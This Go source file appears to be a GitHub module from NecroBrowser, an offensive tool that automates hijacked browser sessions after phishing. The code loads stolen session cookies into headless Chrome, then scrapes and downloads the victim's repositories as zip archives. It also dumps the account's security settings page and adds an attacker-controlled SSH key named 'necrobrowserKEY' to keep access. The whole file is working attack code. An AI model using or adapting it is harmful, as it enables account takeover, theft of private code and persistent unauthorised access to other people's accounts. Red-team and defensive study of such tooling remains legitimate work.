package github

import (
	"context"
	"fmt"
	"strings"

	"github.com/PuerkitoBio/goquery"
	"github.com/chromedp/chromedp"

	"github.com/muraenateam/necrobrowser/action"
	"github.com/muraenateam/necrobrowser/action/cookie"
	"github.com/muraenateam/necrobrowser/action/dom"
	"github.com/muraenateam/necrobrowser/action/navigation"
	"github.com/muraenateam/necrobrowser/log"
	"github.com/muraenateam/necrobrowser/zombie"
)

const (
	// Name of this zombie
	Name = "GitHub"
)

type Github struct {
	zombie.Target

	URL         string
	SecurityURL string
	SSHURLPath  string
	SSHKeyName  string
	SSHKeyValue string
	ReposPath   string
}

type Extrusion struct {
	zombie.Extrusion

	Keys         string // base64 encoded /settings/keys HTML page content
	Security     string // base64 encoded /settings/security HTML page content
	Profile      string
	Account      string
	Emails       string
	Repositories map[string]string // full path - base64 encoded .zip content
}

func NewGithub(target zombie.Target) *Github {

	target.Tag = zombie.GetTag(Name)
	return &Github{
		Target:      target,
		URL:         "https://github.com/settings",
		SecurityURL: "https://github.com/settings/security",
		SSHURLPath:  "https://github.com/settings/ssh/new",
		ReposPath:   "https://github.com/settings/repositories",

		SSHKeyName:  "necrobrowserKEY",
		SSHKeyValue: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjnAXzGzhohx+e3Hy6fSuRDeHTlloDqq9sfspSCG4jbtbTVLK/EHtf8F8k4UkEndTxQlm43UNx7U+XwgHjRSCdoviQzwaXHi9gcmVSKVuGt/FGjjQsloFRZRJGBm0/WzP0VnOYgGQw5frVaxcXJAgQ8eGxgftQcrYWaypWwP/WrkvVs7QSKqU6nfv5IrWCFPqH6+J+kImo05S6pDGExmsbUCiPXpA3r6F/18N9HE1MFCKJfZT/HpdXq6L0hriyKWqPy+SPvZihadE8yFMw9cpxZ1ODWzzWCGIRhtRXJ6+jjMbMJI2811ooemn76kmTmRKBI1ur79ZPeWF/dJLUXCgt",
	}
}

// Name returns the zombie name
func (z *Github) Name() string {
	return Name
}

// SetLootPath updates the zombie target object
func (z *Github) SetLootPath(lp string) {
	z.Target.LootPath = lp
}

// SetContext updates the zombie context object
func (z *Github) SetContext(c context.Context) {
	z.Target.Context = c
}

// Instrument instructs the chrome context to perform operations on the defined target
func (z *Github) Instrument() (interface{}, error) {

	var (
		ext Extrusion
		err error
	)

	z.Debug("Instrumenting")
	a := action.Action{Target: z.Target}

	// Set session Cookies
	c := &cookie.Cookie{Action: a}
	if err = c.SetSessionCookies(); err != nil {
		log.Error("Error setting session cookies: %v", err)
		return nil, err
	}

	// Take Screenshot
	//s := &screenshot.Screenshot{
	//	Action:   a,
	//	URL:      z.SecurityURL,
	//	Selector: `#js-pjax-container > div > div.col-9.float-left`,
	//}
	//s.Target = z.Target
	//if err = s.Take(); err != nil {
	//	log.Error("Error taking screenshot: %v", err)
	//}

	// Scrape and download repositories
	var repHtml string
	repDom := &dom.DOM{
		Action:   a,
		URL:      z.ReposPath,
		Selector: `.js-collab-repo-owner`,
	}
	if err = repDom.DumpSelector(&repHtml); err != nil {
		log.Error("Error retrieving DOM elements: %v", err)
		return nil, err
	}

	r := strings.NewReader(repHtml)
	doc, err := goquery.NewDocumentFromReader(r)

	doc.Find("a").Each(func(i int, s *goquery.Selection) {
		repo, ok := s.Attr("href")
		if ok {
			var repoLink = fmt.Sprintf("https://github.com%s/archive/master.zip", repo)
			log.Info("Downloading repository %s", repoLink)

			n := &navigation.Navigation{
				URL: repoLink,
			}
			n.Target = zombie.Target{Context: z.Context}
			n.Navigate()
		}
	})

	//
	// Dump Settings
	//
	var html string
	d := &dom.DOM{
		Action:   a,
		URL:      z.SecurityURL,
		Selector: `#js-pjax-container > div > div.col-9.float-left`,
	}
	if err = d.DumpSelector(&html); err != nil {
		log.Error("Error retrieving DOM elements: %v", err)
		return nil, err
	}

	// we need the Extrusion struct in fact only is we want to return extruded data in JSON responses
	//ext.Security = base64.StdEncoding.EncodeToString([]byte(html))

	//
	// Custom Operations
	// - Add SSH Key
	//

	// Add necro SSH key
	if err := chromedp.Run(z.Context, z.addSSHKey()); err != nil {
		log.Error("Error adding Necro SSH key: %s", err)
	}

	return ext, nil
}
